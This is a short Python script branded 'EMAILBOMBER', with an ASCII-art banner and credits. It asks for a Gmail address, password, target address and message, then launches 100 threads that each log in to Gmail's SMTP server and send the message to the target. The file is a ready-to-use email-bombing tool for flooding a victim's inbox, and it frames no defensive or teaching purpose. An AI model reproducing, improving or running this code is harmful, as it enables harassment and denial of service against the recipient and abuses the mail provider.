import smtplib, colorama, os
from colorama import Fore
from threading import Thread

os.system('cls')
os.system('title [EMAILBOMBER] By Cihan820')

print(f'''{Fore.BLUE}
 ██████╗██╗██╗  ██╗ █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗     ███╗   ███╗ █████╗ ██╗██╗         ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝██║██║  ██║██╔══██╗████╗  ██║██╔══██╗╚════██╗██╔═████╗    ████╗ ████║██╔══██╗██║██║         ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
██║     ██║███████║███████║██╔██╗ ██║╚█████╔╝ █████╔╝██║██╔██║    ██╔████╔██║███████║██║██║         ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██║     ██║██╔══██║██╔══██║██║╚██╗██║██╔══██╗██╔═══╝ ████╔╝██║    ██║╚██╔╝██║██╔══██║██║██║         ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
╚██████╗██║██║  ██║██║  ██║██║ ╚████║╚█████╔╝███████╗╚██████╔╝    ██║ ╚═╝ ██║██║  ██║██║███████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
 ╚═════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
    Creator: Dropout
    Editer: Cihan820#0008          

{Fore.RESET}''')

user = input(f'{Fore.BLUE}> {Fore.RESET}Gmail: ')
passw = input(f'{Fore.BLUE}> {Fore.RESET}Password: ')
tar = input(f'{Fore.BLUE}> {Fore.RESET}Target Mail: ')
msg = input(f'{Fore.BLUE}> {Fore.RESET}Message: ')

def Main():
    global user
    global passw
    global tar
    global msg
    _smpt = smtplib.SMTP('smtp.gmail.com', 587)
    _smpt.starttls()
    username = user
    password = passw
    try:
        _smpt.login(username, password)
    except:
        print(f"Error")
        input()
        exit()
    target = tar
    message = msg
    _smpt.sendmail(username, target, message)
    print(f'{Fore.GREEN}> {Fore.RESET}Send')

for i in range(0, 100):
    Thread(target=Main).start()
